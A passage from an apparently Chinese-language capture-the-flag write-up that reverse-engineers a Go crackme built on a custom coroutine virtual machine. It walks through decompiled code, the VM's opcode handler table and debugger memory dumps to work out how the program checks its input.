inputl_1 = inputl;</span><br><span class="line">      p_main_coroutVM_2 = p_main_coroutVM_1;</span><br><span class="line">      mem = p_main_coroutVM_1-&gt;mem;</span><br><span class="line">      checkres = _RSI_1;</span><br><span class="line">      <span class="keyword">if</span> ( _RSI_1 != p_main_coroutVM_1-&gt;mem )</span><br><span class="line">      &#123;</span><br><span class="line">        runtime_memmove(p_main_coroutVM_1-&gt;mem, _RSI_1, <span class="number">0x14u</span>LL);</span><br><span class="line">        inputl = inputl_1;</span><br><span class="line">        len_1 = len;</span><br><span class="line">        checkres = _RSI_1;</span><br><span class="line">        p_main_coroutVM_2 = p_main_coroutVM_1;</span><br><span class="line">        LODWORD(instr_1) = instr_3;</span><br><span class="line">        LODWORD(checkres_1) = checkres_2;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( len_1 &gt;= <span class="number">40</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        checkres = (checkres + <span class="number">20</span>);</span><br><span class="line">        <span class="keyword">if</span> ( checkres != inputl-&gt;mem )</span><br><span class="line">          runtime_memmove(inputl-&gt;mem, checkres, <span class="number">0x14u</span>LL);</span><br><span class="line">        v37 = runtime_newobject(</span><br><span class="line">                &amp;qword_27CF60,</span><br><span class="line">                checkres,</span><br><span class="line">                v28,</span><br><span class="line">                mem,</span><br><span class="line">                p_main_coroutVM_2,</span><br><span class="line">                instr_1,</span><br><span class="line">                checkres_1,</span><br><span class="line">                p_string_1,</span><br><span class="line">                v29);</span><br><span class="line">        *v37 = main_main_gowrap1;</span><br><span class="line">        <span class="keyword">if</span> ( dword_395690 )</span><br><span class="line">        &#123;</span><br><span class="line">          v37 = runtime_gcWriteBarrier1(v37, checkres, main_main_gowrap1, mem, p_main_coroutVM_2);</span><br><span class="line">          inputh = p_main_coroutVM_1;</span><br><span class="line">          *v41 = p_main_coroutVM_1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          inputh = p_main_coroutVM_1;</span><br><span class="line">        &#125;</span><br><span class="line">        v37[<span class="number">1</span>] = inputh;</span><br><span class="line">        runtime_newproc(v37, checkres, inputh, mem, p_main_coroutVM_2, v38, v39, v40, v41);</span><br><span class="line">        v48 = runtime_newobject(&amp;qword_27CF60, checkres, v43, mem, p_main_coroutVM_2, v44, v45, v46, v47);</span><br><span class="line">        *v48 = main_main_gowrap2;</span><br><span class="line">        <span class="keyword">if</span> ( dword_395690 )</span><br><span class="line">        &#123;</span><br><span class="line">          v48 = runtime_gcWriteBarrier1(v48, checkres, main_main_gowrap2, mem, p_main_coroutVM_2);</span><br><span class="line">          inputl_2 = inputl_1;</span><br><span class="line">          *v52 = inputl_1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          inputl_2 = inputl_1;</span><br><span class="line">        &#125;</span><br><span class="line">        v48[<span class="number">1</span>] = inputl_2;</span><br><span class="line">        runtime_newproc(v48, checkres, inputl_2, mem, p_main_coroutVM_2, v49, v50, v51, v52);</span><br><span class="line">        instr_4 = instr_2;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; i = i_1 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ::i &lt;= i )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">          v86 = <span class="number">0</span>;</span><br><span class="line">          p_main_coroutVM_2 = (i + <span class="number">4</span>);</span><br><span class="line">          <span class="keyword">if</span> ( qword_348480 &lt; (i + <span class="number">4</span>) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_41;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt; p_main_coroutVM_2 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          i_1 = i + <span class="number">4</span>;</span><br><span class="line">          mem = ::mem;</span><br><span class="line">          v75 = ((i - qword_348480) &gt;&gt; <span class="number">63</span>) &amp; i;</span><br><span class="line">          <span class="keyword">if</span> ( &amp;v86 != (::mem + v75) )</span><br><span class="line">            v86 = *(::mem + v75);</span><br><span class="line">          runtime_chansend1(instr_4, &amp;v86, instr_4, ::mem, p_main_coroutVM_2, v75, v55, v56, v57);</span><br><span class="line">          checkres = &amp;v86;</span><br><span class="line">          runtime_chansend1(instr_3, &amp;v86, v70, mem, p_main_coroutVM_2, v71, v72, v73, v74);</span><br><span class="line">          instr_4 = instr_2;</span><br><span class="line">        &#125;</span><br><span class="line">        i = runtime_panicSliceB(i, checkres, i + <span class="number">4</span>);</span><br><span class="line">LABEL_41:</span><br><span class="line">        inputl = runtime_panicSliceAcap(i, checkres, p_main_coroutVM_2);</span><br><span class="line">      &#125;</span><br><span class="line">      inputl = runtime_panicSliceAcap(inputl, checkres, <span class="number">40LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    runtime_panicSliceAcap(inputl, checkres, <span class="number">20LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v99[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">  v99[<span class="number">1</span>] = &amp;off_2B8B18;</span><br><span class="line">  LODWORD(mem) = <span class="number">1</span>;</span><br><span class="line">  LODWORD(p_main_coroutVM_2) = <span class="number">1</span>;</span><br><span class="line">  fmt_Fprintln(off_2B9218, qword_350000, v99, <span class="number">1</span>, <span class="number">1</span>, instr_1, checkres_1, p_string, v29, v78, v81);</span><br><span class="line">LABEL_28:</span><br><span class="line">  v87 = <span class="number">0</span>;</span><br><span class="line">  runtime_chanrecv1(checkres_2, &amp;v87, instr_4, mem, p_main_coroutVM_2, v54, v55, v56, v57);</span><br><span class="line">  v60 = v87;</span><br><span class="line">  v85 = v87;</span><br><span class="line">  v87 = <span class="number">0</span>;</span><br><span class="line">  runtime_chanrecv1(checkres_2, &amp;v87, v60, mem, p_main_coroutVM_2, v61, v62, v63, v64);</span><br><span class="line">  v69 = v87;</span><br><span class="line">  v87 = v85;</span><br><span class="line">  <span class="keyword">if</span> ( v85 )</span><br><span class="line">    v87 = v69;</span><br><span class="line">  <span class="keyword">if</span> ( v87 )</span><br><span class="line">  &#123;</span><br><span class="line">    v98[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">    v98[<span class="number">1</span>] = &amp;off_2B8B28;</span><br><span class="line">    fmt_Fprintln(off_2B9218, qword_350000, v98, <span class="number">1</span>, <span class="number">1</span>, v65, v66, v67, v68, v78, v81);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v97[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">    v97[<span class="number">1</span>] = &amp;off_2B8B38;</span><br><span class="line">    fmt_Fprintln(off_2B9218, qword_350000, v97, <span class="number">1</span>, <span class="number">1</span>, v65, v66, v67, v68, v78, v81);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看着很长，实际也不短，不过go语言废话多，动调分析一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fmt_Fscanf(</span><br><span class="line">   off_2B9238,</span><br><span class="line">   qword_34FFF8,</span><br><span class="line">   &amp;a0ILm51YSiTvrru[<span class="number">19</span>],</span><br><span class="line">   <span class="number">2</span>,</span><br><span class="line">   v100,</span><br><span class="line">   <span class="number">1</span>,</span><br><span class="line">   <span class="number">1</span>,</span><br><span class="line">   v12,</span><br><span class="line">   v13,</span><br><span class="line">   v77,</span><br><span class="line">   v80,</span><br><span class="line">   v82,</span><br><span class="line">   HIDWORD(v82),</span><br><span class="line">   v83,</span><br><span class="line">   HIDWORD(v83),</span><br><span class="line">   v84,</span><br><span class="line">   HIDWORD(v84));</span><br><span class="line"> ptr = p_string-&gt;ptr;</span><br><span class="line"> len = p_string-&gt;len;</span><br></pre></td></tr></table></figure><p>输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( len_1 &gt;= <span class="number">40</span> )</span><br><span class="line">&#123;</span><br><span class="line">  checkres = (checkres + <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> ( checkres != inputl-&gt;mem )</span><br><span class="line">    runtime_memmove(inputl-&gt;mem, checkres, <span class="number">0x14u</span>LL);</span><br><span class="line">  v37 = runtime_newobject(</span><br><span class="line">          &amp;qword_27CF60,</span><br><span class="line">          checkres,</span><br><span class="line">          v28,</span><br><span class="line">          mem,</span><br><span class="line">          p_main_coroutVM_2,</span><br><span class="line">          instr_1,</span><br><span class="line">          checkres_1,</span><br><span class="line">          p_string_1,</span><br><span class="line">          v29);</span><br><span class="line">  *v37 = main_main_gowrap1;</span><br><span class="line">  <span class="keyword">if</span> ( dword_395690 )</span><br><span class="line">  &#123;</span><br><span class="line">    v37 = runtime_gcWriteBarrier1(v37, checkres, main_main_gowrap1, mem, p_main_coroutVM_2);</span><br><span class="line">    inputh = p_main_coroutVM_1;</span><br><span class="line">    *v41 = p_main_coroutVM_1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    inputh = p_main_coroutVM_1;</span><br><span class="line">  &#125;</span><br><span class="line">  v37[<span class="number">1</span>] = inputh;</span><br><span class="line">  runtime_newproc(v37, checkres, inputh, mem, p_main_coroutVM_2, v38, v39, v40, v41);</span><br><span class="line">  v48 = runtime_newobject(&amp;qword_27CF60, checkres, v43, mem, p_main_coroutVM_2, v44, v45, v46, v47);</span><br><span class="line">  *v48 = main_main_gowrap2;</span><br><span class="line">  <span class="keyword">if</span> ( dword_395690 )</span><br><span class="line">  &#123;</span><br><span class="line">    v48 = runtime_gcWriteBarrier1(v48, checkres, main_main_gowrap2, mem, p_main_coroutVM_2);</span><br><span class="line">    inputl_2 = inputl_1;</span><br><span class="line">    *v52 = inputl_1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    inputl_2 = inputl_1;</span><br><span class="line">  &#125;</span><br><span class="line">  v48[<span class="number">1</span>] = inputl_2;</span><br><span class="line">  runtime_newproc(v48, checkres, inputl_2, mem, p_main_coroutVM_2, v49, v50, v51, v52);</span><br></pre></td></tr></table></figure><p>runtime_gcWriteBarrier1感觉是在加载函数，也就是main_main_gowrap1，main_main_gowrap2</p><p>加载之后后面runtime_newproc就是在调用了函数总之逻辑在上面这两个里（这里可以关注一下mem和mem赋值，这个是opcode）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.(*coroutVM).run</span></span><br><span class="line"><span class="type">void</span> __golang <span class="title function_">main__ptr_coroutVM_run</span><span class="params">(_ptr_main_coroutVM a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v2; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r11d</span></span><br><span class="line">  _chan_left_chan__4_uint8 instr; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r11d</span></span><br><span class="line">  map_uint8_main_handler instrSet; <span class="comment">// rbx</span></span><br><span class="line">  __int64 **v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+10h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [rsp+27h] [rbp-11h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v18; <span class="comment">// [rsp+2Bh] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [rsp+2Fh] [rbp-9h] BYREF</span></span><br><span class="line">  _chan_left_chan__4_uint8 i; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  instr = a1-&gt;instr;</span><br><span class="line">  <span class="keyword">for</span> ( i = instr; runtime_chanrecv2(instr, &amp;v18, instr, v1, v2, v3, v4, v5, v6); instr = i )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = v18;</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">    v2 = (v17 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    v1 = HIBYTE(v17);</span><br><span class="line">    v19 = v17;</span><br><span class="line">    instrSet = a1-&gt;instrSet;</span><br><span class="line">    v13 = runtime_mapaccess2(</span><br><span class="line">            &amp;RTYPE_map_uint8_main_handler,</span><br><span class="line">            instrSet,</span><br><span class="line">            &amp;v19,</span><br><span class="line">            HIBYTE(v17),</span><br><span class="line">            v2,</span><br><span class="line">            v8,</span><br><span class="line">            v9,</span><br><span class="line">            v10,</span><br><span class="line">            v11,</span><br><span class="line">            v14,</span><br><span class="line">            v15,</span><br><span class="line">            v16);</span><br><span class="line">    <span class="keyword">if</span> ( instrSet )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = **v13;</span><br><span class="line">      LOWORD(v14) = v17 &gt;&gt; <span class="number">8</span>;</span><br><span class="line">      BYTE2(v14) = HIBYTE(v17);</span><br><span class="line">      (v2)(a1);</span><br><span class="line">      <span class="keyword">if</span> ( v17 == <span class="number">0xFF</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是主要逻辑了，runtime_chanrecv2是在解析instr然后给v18，给了v18之后v18给v17再次解析（这里的instr就是opcode的当前部分？或者是总体指针没太关注）</p><p>最后解析结果给v13，后面v13给了v2，v2动调发现是一个叫main_mov的函数（并且会变）跟踪者往上寻找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">0000000000299F</span>60 add             dq offset main_ADD      ; DATA XREF: main_map_init_0:loc_267F5B↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>60                                         ; main_map_init_1:loc_2682FB↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>68 and             dq offset main_AND      ; DATA XREF: main_map_init_0:loc_2680B3↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>68                                         ; main_map_init_1:loc_268453↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>70 hlt             dq offset main_HLT      ; DATA XREF: main_map_init_0:loc_268141↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>70                                         ; main_map_init_1:loc_2684E1↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>78 ldr             dq offset main_LDR      ; DATA XREF: main_map_init_0:loc_267E3B↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>78                                         ; main_map_init_1:loc_2681DB↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>80 ldri            dq offset main_LDRI     ; DATA XREF: main_map_init_0:loc_267E73↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>80                                         ; main_map_init_1:loc_268213↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>88 lsl             dq offset main_LSL      ; DATA XREF: main_map_init_0:loc_268008↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>88                                         ; main_map_init_1:loc_2683A8↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>90 lsr             dq offset main_LSR      ; DATA XREF: main_map_init_0:loc_268040↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>90                                         ; main_map_init_1:loc_2683E0↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>98 mov             dq offset main_MOV      ; DATA XREF: main_map_init_0:loc_267F20↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>98                                         ; main_map_init_1:loc_2682C0↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>A0 mul             dq offset main_MUL      ; DATA XREF: main_map_init_0:loc_267FCD↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>A0                                         ; main_map_init_1:loc_26836D↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>A8 ret             dq offset main_RET      ; DATA XREF: main_map_init_0:loc_2680ED↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>A8                                         ; main_map_init_1:loc_26848D↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>B0 str             dq offset main_STR      ; DATA XREF: main_map_init_0:loc_267EAD↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>B0                                         ; main_map_init_1:loc_26824D↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>B8 stri            dq offset main_STRI     ; DATA XREF: main_map_init_0:loc_267EE8↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>B8                                         ; main_map_init_1:loc_268288↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>C0 sub             dq offset main_SUB      ; DATA XREF: main_map_init_0:loc_267F93↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>C0                                         ; main_map_init_1:loc_268333↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>C8 xor             dq offset main_XOR      ; DATA XREF: main_map_init_0:loc_26807B↑o</span><br><span class="line">.rdata:<span class="number">0000000000299F</span>C8                                         ; main_map_init_1:loc_26841B↑o</span><br></pre></td></tr></table></figure><p>有点像vm的操作码了，并且在动调找操作码对应hex的时候，也就是runtime_mapaccess2解析后返回函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v41 = &amp;v48[size];</span><br><span class="line"> <span class="keyword">if</span> ( (p_RTYPE_map_uint8_main_handler_1[<span class="number">2</span>].ptrdata &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">   <span class="keyword">return</span> *&amp;v48[size];</span><br><span class="line"> <span class="keyword">return</span> v41;</span><br></pre></td></tr></table></figure><p>这里有可能返回v41，所以动调去看v41里的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">debug056:<span class="number">000000</span>C000090000 qword_C000090000 dq <span class="number">808041457215144</span>Eh   ; DATA XREF: debug056:<span class="number">000000</span>C000081F68↑o</span><br><span class="line">debug056:<span class="number">000000</span>C000090008 dq <span class="number">12</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C000090010 dq offset ldri</span><br><span class="line">debug056:<span class="number">000000</span>C000090018 dq <span class="number">15</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C000090020 dq offset str</span><br><span class="line">debug056:<span class="number">000000</span>C000090028 dq <span class="number">16</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C000090030 dq offset stri</span><br><span class="line">debug056:<span class="number">000000</span>C000090038 qword_C000090038 dq <span class="number">2</span>Ah                 ; DATA XREF: debug056:<span class="number">000000</span>C000081F58↑o</span><br><span class="line">debug056:<span class="number">000000</span>C000090040 dq offset mov</span><br><span class="line">debug056:<span class="number">000000</span>C000090048 dq <span class="number">42</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C000090050 dq offset sub</span><br><span class="line">debug056:<span class="number">000000</span>C000090058 dq <span class="number">73</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C000090060 dq offset lsr</span><br><span class="line">debug056:<span class="number">000000</span>C000090068 dq <span class="number">0</span></span><br><span class="line">debug056:<span class="number">000000</span>C000090070 dq <span class="number">0</span></span><br><span class="line">debug056:<span class="number">000000</span>C000090078 dq <span class="number">0</span></span><br><span class="line">debug056:<span class="number">000000</span>C000090080 dq <span class="number">0</span></span><br><span class="line">debug056:<span class="number">000000</span>C000090088 dq <span class="number">7E70506902607</span>B66h</span><br><span class="line">debug056:<span class="number">000000</span>C000090090 dq <span class="number">11</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C000090098 dq offset ldr</span><br><span class="line">debug056:<span class="number">000000</span>C0000900A0 dq <span class="number">41</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C0000900A8 dq offset add</span><br><span class="line">debug056:<span class="number">000000</span>C0000900B0 dq <span class="number">47</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C0000900B8 dq offset mul</span><br><span class="line">debug056:<span class="number">000000</span>C0000900C0 dq <span class="number">71</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C0000900C8 dq offset lsl</span><br><span class="line">debug056:<span class="number">000000</span>C0000900D0 dq <span class="number">7</span>Ah</span><br><span class="line">debug056:<span class="number">000000</span>C0000900D8 dq offset xor</span><br><span class="line">debug056:<span class="number">000000</span>C0000900E0 dq <span class="number">7B</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C0000900E8 dq offset and</span><br><span class="line">debug056:<span class="number">000000</span>C0000900F0 dq <span class="number">0F</span>Eh</span><br><span class="line">debug056:<span class="number">000000</span>C0000900F8 dq offset ret</span><br><span class="line">debug056:<span class="number">000000</span>C000090100 dq <span class="number">0F</span>Fh</span><br><span class="line">debug056:<span class="number">000000</span>C000090108 dq offset hlt</span><br><span class="line">debug056:<span class="number">000000</span>C000090110 dq <span class="number">0</span></span><br><span class="line">debug056:<span class="number">000000</span>C000090118 dq <span class="number">0</span></span><br><span class="line">debug056:<span class="number">000000</span>C000090120 dq <span class="number">80805B</span>7F4D195072h</span><br><span class="line">debug056:<span class="number">000000</span>C000090128 dq <span class="number">14</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C000090130 dq offset ldri</span><br><span class="line">debug056:<span class="number">000000</span>C000090138 dq <span class="number">18</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C000090140 dq offset stri</span><br><span class="line">debug056:<span class="number">000000</span>C000090148 dq <span class="number">2B</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C000090150 dq offset mov</span><br><span class="line">debug056:<span class="number">000000</span>C000090158 dq <span class="number">0</span>CAh</span><br><span class="line">debug056:<span class="number">000000</span>C000090160 dq offset xor</span><br><span class="line">debug056:<span class="number">000000</span>C000090168 dq <span class="number">0F</span>Eh</span><br><span class="line">debug056:<span class="number">000000</span>C000090170 dq offset ret</span><br><span class="line">debug056:<span class="number">000000</span>C000090178 dq <span class="number">0F</span>Fh</span><br><span class="line">debug056:<span class="number">000000</span>C000090180 dq offset hlt</span><br><span class="line">debug056:<span class="number">000000</span>C000090188 dq <span class="number">0</span></span><br><span class="line">debug056:<span class="number">000000</span>C000090190 dq <span class="number">0</span></span><br><span class="line">debug056:<span class="number">000000</span>C000090198 dq <span class="number">0</span></span><br><span class="line">debug056:<span class="number">000000</span>C0000901A0 dq <span class="number">0</span></span><br><span class="line">debug056:<span class="number">000000</span>C0000901A8 dq <span class="number">497</span>C2A1F61216141h</span><br><span class="line">debug056:<span class="number">000000</span>C0000901B0 dq <span class="number">13</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C0000901B8 dq offset ldr</span><br><span class="line">debug056:<span class="number">000000</span>C0000901C0 dq <span class="number">17</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C0000901C8 dq offset str</span><br><span class="line">debug056:<span class="number">000000</span>C0000901D0 dq <span class="number">91</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C0000901D8 dq offset add</span><br><span class="line">debug056:<span class="number">000000</span>C0000901E0 dq <span class="number">92</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C0000901E8 dq offset sub</span><br><span class="line">debug056:<span class="number">000000</span>C0000901F0 dq <span class="number">97</span>h</span><br><span class="line">debug056:<span class="number">000000</span>C0000901F8 dq offset mul</span><br><span class="line">debug056:<span class="number">000000</span>C000090200 dq <span class="number">0</span>C1h</span><br><span class="line">debug056:<span class="number">000000</span>C000090208 dq offset lsl</span><br><span class="line">debug056:<span class="number">000000</span>C000090210 dq <span class="number">0</span>C3h</span><br><span class="line">debug056:<span class="number">000000</span>C000090218 dq offset lsr</span><br><span class="line">debug056:<span class="number">000000</span>C000090220 dq <span class="number">0</span>CBh</span><br><span class="line">debug056:<span class="number">000000</span>C000090228 dq offset and</span><br></pre></td></tr></table></figure><p>这里一个hex紧跟着一个操作函数，并且0x2A对应mov在之前，v17中经常出现，本来我以为这个v17是输入，但是多次改变输入发现仍然会是0x2A, 0x00, 0x37, 0x9E，后面看到这里再加上之前在v2函数跟踪的时候点到过mem，然后看到了0x2A, 0x00, 0x37, 